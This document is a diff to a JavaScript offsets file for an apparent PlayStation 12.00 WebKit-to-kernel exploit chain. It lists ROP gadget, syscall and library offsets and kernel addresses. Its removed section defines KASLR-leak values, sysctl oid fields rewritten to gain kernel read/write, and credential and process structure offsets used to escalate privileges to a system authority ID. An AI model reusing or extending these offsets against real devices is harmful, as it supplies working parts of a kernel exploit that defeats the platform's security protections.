@@ -1,13 +1,14 @@
 // 12.00 -- generated from libSceNKWebKit / libkernel_web /
 // libSceLibcInternal. file offset = rva + 0x4000
-// Retarget: lapse2 WebKit -> 4-bug 13.60 kernel chain (rt_msg2 dropped; back-half self-leaks kbase).
-// Verified 2026-09-07: lk/lc exports by NID, 26 gadgets by bytes, syscall stubs by opcode,
-// imports by reloc, kernel globals by RIP-xref (12.00 base=slopdev re-verified; 13.60 fresh).
 
-// host-constructor candidates: webkitBase = nativeCtorAddr - hc  (all 3 are jmp-thunks to the
-// common native-ctor builder; main.js accepts the page-aligned one).
+// host-constructor candidates: webkitBase = nativeCtorAddr - hc
 const OFFSET_wk_host_constructor_candidates = [0x0003A888, 0x0003AAD0, 0x0003BB18];
-const OFFSET_wk_vtable_first_element     = 0x01DD0A90;  // ICF-folded element dtor (mov eax,0x45;ret); fw>=9 fallback
+// vtable[0] of HTMLTextAreaElement - the ICF-folded WebCore Element destructor,
+// derived from this firmware's libSceNKWebKit. main.js only reads it below 9.00,
+// so on this firmware it is a fallback that has never been exercised; it replaces
+// the WKDownloadGetTypeID export that used to be parked here, which was not a
+// vtable entry at all. Method validated 20/20 on 7.00-8.60, retail and devkit.
+const OFFSET_wk_vtable_first_element     = 0x01DD0A90;
 const OFFSET_wk_memset_import                  = 0x03510238;
 const OFFSET_wk___stack_chk_guard_import       = 0x0350DB88;
 
@@ -26,8 +27,7 @@ const OFFSET_lk_sceKernelSendNotificationRequest = 0x000048B0;
 const OFFSET_lk_sysctlbyname                   = 0x00013BB0;
 const OFFSET_lk_pthread_create                 = 0x00021150;
 const OFFSET_lk_getpid                         = 0x0001B7D0;
-const OFFSET_lk__thread_list                   = 0x00064218;  // pthread list head (xref-derived, non-NID)
-// PRIMARY path: saved worker cond_wait return PC fingerprint (return of call <park>).
+const OFFSET_lk__thread_list                   = 0x00064218;
 const OFFSET_lk_worker_wait_return             = 0x0001FC71;
 const OFFSET_lk_sleep                          = 0x00027E70;
 const OFFSET_lk_sceKernelGetCurrentCpu         = 0x00001200;
@@ -42,7 +42,7 @@ const OFFSET_lc_vsnprintf                      = 0x0005CF50;
 const OFFSET_lc_setjmp                         = 0x0005B850;
 const OFFSET_lc_longjmp                        = 0x0005B8A0;
 
-// Fallback estimate only (unused while the fingerprint above is defined).
+// Fallback estimate only; main.js fingerprints the saved worker PC at runtime.
 const OFFSET_WORKER_STACK_OFFSET         = 0x0007FB68;
 
 let wk_gadgetmap = {
@@ -404,13 +404,12 @@ let syscall_map = {
 	0x2D1: 0x0001CF50,
 	0x2D2: 0x0001B030,
 	0x2D5: 0x0001C6C0,
-	0x2D7: 0x0001B7D7,
 	0x2DC: 0x0001CC30,
 	0x2DD: 0x0001B3F0,
 };
 
-// Firmware-specific kernel offsets (RVA from kbase 0xFFFFFFFF80210000).
-// Text-relative except the two invariant syscall-stack frame offsets.
+// Firmware-specific kernel offsets from the validated SDK family table.
+// Text-relative except for the two invariant syscall-stack frame offsets.
 const OFFSET_KERNEL_STACK_COOKIE                = 0x00000930;
 const OFFSET_KERNEL_STACK_SYS_SCHED_YIELD_RET   = 0x00000808;
 const OFFSET_KERNEL_DATA                        = 0x00D50000;
@@ -421,98 +420,3 @@ const OFFSET_KERNEL_TARGETID                    = 0x01AD306D;
 const OFFSET_KERNEL_QA_FLAGS                    = 0x01AD3088;
 const OFFSET_KERNEL_UTOKEN_FLAGS                = 0x01AD30F0;
 const OFFSET_KERNEL_ROOTVNODE                   = 0x03E27510;
-
-// ---- aio.js port additions (2026-09-10): symbols aio framework/kexp read that the lapse 12.00 set lacked ----
-const OFFSET_KERNEL_EVF_STR         = 0x011BC869;  // "evf cv" @0xffffffff813cc869 - KBASE(0x80210000) [IDA 12.00]
-const OFFSET_KERNEL_VMSPACE_P_ROOT  = 0x1d0;       // struct offset (fw-invariant)
-const OFFSET_KERNEL_VMSPACE_VM_PMAP = 0x2e8;       // struct offset (fw-invariant)
-const OFFSET_kaslr_leak_static      = 0x00B6EC71;  // route_output rt_msg2 call-site ret - KBASE (doc; aio uses RTMSG2 table)
-const OFFSET_kaslr_leak_ret         = 0x00B6EC74;  // ret+3 (doc)
-
-/* ===================================================================
- * relapse window.KRW + window.SYMBOLS -- 12.00 port (americana .i64).
- * Values marked VERIFY/null are the known-hard oid-triple bits; the
- * exploit's validator names any null and halts BEFORE touching the
- * kernel, so a null here is a safe "derive next", never a panic.
- * oid layout on 12.00: number+0x10, kind+0x14, arg1+0x18, arg2+0x20.
- * =================================================================== */
-window.KRW = {
-    firmware: "12.00",
-    kernelData: OFFSET_KERNEL_DATA,
-    allproc:    OFFSET_KERNEL_ALLPROC,
-    rootvnode:  OFFSET_KERNEL_ROOTVNODE,
-
-    // rtmsg2 leak: kbase = ret - retStatic. poopicker 12.00: static=0xB6EC71.
-    kaslr: { mode: "rtmsg2", retStatic: 0x00B6EC71, retLow16: 0xEC71 },
-
-    oid: {
-        // exploit.js hardcodes kern.smp.cpus (A) / kern.smp.maxcpus (B). kind = 0x80048002
-        // (== 11.60 originalKind exactly). writable: byte3 0x80->0x70 (16 decs): clear RD, set WR|ANYBODY|0x20.
-        originalKind: 0x80048002,
-        writableKind: 0x70048002,
-        // a = kern.smp.cpus (visible, oid_number set). a.arg1 VALUE(0x294b3f8) - 0x100 = &b.arg1(0x294b2f8).
-        a: {
-            base: 0x0294b408, kind: 0x0294b41c, kindByte3: 0x0294b41f,
-            arg1: 0x0294b420, arg1Byte1: 0x0294b421, arg1Value: 0x0294b3f8,
-            deadSink: 0x0294b428,   // a.oid_arg2 (=0, absorbs the mandatory first dec while arg1 != 0)
-        },
-        // b = kern.smp.maxcpus (HIDDEN: oid_number=0xffffffff -> read ENOENT until un-hidden).
-        b: {
-            base: 0x0294b2e0, kind: 0x0294b2f4, kindByte3: 0x0294b2f7,
-            arg1: 0x0294b2f8, arg1Value: 0x0294b210,
-            visible: 0x0294b330,   // b.base+0x50: cpus(visible)=1 vs maxcpus(hidden)=0 (diff-confirmed gate)
-        },
-        // c = p1003_1b.priority_scheduling (static mib [9,8] confirmed reachable on 12.00)
-        c: {
-            base: 0x02c6e108, kind: 0x02c6e11c, arg1: 0x02c6e120,
-            arg1Value: 0x03da32bc, mib: [9, 8],
-        },
-    },
-
-    // p1003_1b.prioritized_io (static mib), inert dword for walk counting + write self-test.
-    walkCounter: { addr: 0x03da32b8, mib: [9, 7] },
-
-    // VERIFY: an initialised mutex STRUCT base (lockword - 0x18) on 12.00.
-    nodeMutex: 0x01b4dd78,   // A53IO(0x1b4dd90) - 0x18 = mtx struct base; lapse locks +0x18 OK
-
-    // .rodata probe: "_aio_submit_cmd\0_aio_multi_wait" @ krel 0x11c8f51 (confirmed 12.00).
-    rodataProbe: { rva: 0x011c8f51, text: "_aio_submit_cmd\0_aio_multi_wait" },
-
-    aio: {
-        waiterSize: 0x38, requestSize: 0x28,
-        group: { num: 0x00, state: 0x08, waiters: 0x50 },
-        // VERIFY idTable.pages for 12.00 (11.60 was 0x220); slotStride/entryType usually stable.
-        idTable: { pages: 0x220, slotStride: 0x30, entryType: 0x160 },   // *(table+0x220)=pagecount (sc727 RE)
-    },
-
-    // VERIFY proc offsets for 12.00 (these vary per firmware; used AFTER kR/W for escalation/kexp).
-    proc: { pid: 0x0bc, ucred: 0x040, fd: 0x048, aioInfo: 0x0c48, dynlib: 0x3e8 },   // aioInfo=*(proc+3144); pid/dynlib=11.60 (VERIFY)
-    kernelPid: 0,
-
-    ucred: {
-        uid: 0x04, ruid: 0x08, svuid: 0x0c, ngroups: 0x10, rgid: 0x14, svgid: 0x18,
-        sceAuthId: 0x58, sceCaps: 0x60, sceCaps1: 0x68, sceAttrs: 0x80,
-    },
-    sysCoreAuthId: { lo: 0x00000007, hi: 0x48000000 },
-
-    filedesc:      { files: 0x00, cdir: 0x08, rdir: 0x10, jdir: 0x18 },
-    filedescTable: { nfiles: 0x00, ofiles: 0x08, entryStride: 0x30, fileData: 0x00 },
-    pipe: { count: 0x00, in: 0x04, out: 0x08, size: 0x0c, buffer: 0x10, pair: 0xe8, defaultSize: 0x4000 },   // pair=11.60 (VERIFY)
-    dynlib: { syscallStart: 0xf0, syscallEnd: 0xf8, restrictFlags: 0x118, libkernelRef: 0x18 },
-};
-
-window.SYMBOLS = {
-    libkernel: {
-        getpid:                           OFFSET_lk_getpid,
-        sysctlbyname:                     OFFSET_lk_sysctlbyname,
-        sceKernelSendNotificationRequest: OFFSET_lk_sceKernelSendNotificationRequest,
-        pthread_create:                   OFFSET_lk_pthread_create,
-        pthread_create_name_np:           OFFSET_lk_pthread_create_name_np,
-        pthread_join:                     OFFSET_lk_pthread_join,
-    },
-    libc: {
-        malloc: OFFSET_lc_malloc, free: OFFSET_lc_free, memcpy: OFFSET_lc_memcpy,
-        memset: OFFSET_lc_memset, strcmp: OFFSET_lc_strcmp, memcmp: OFFSET_lc_memcmp,
-        vsnprintf: OFFSET_lc_vsnprintf,
-    },
-};
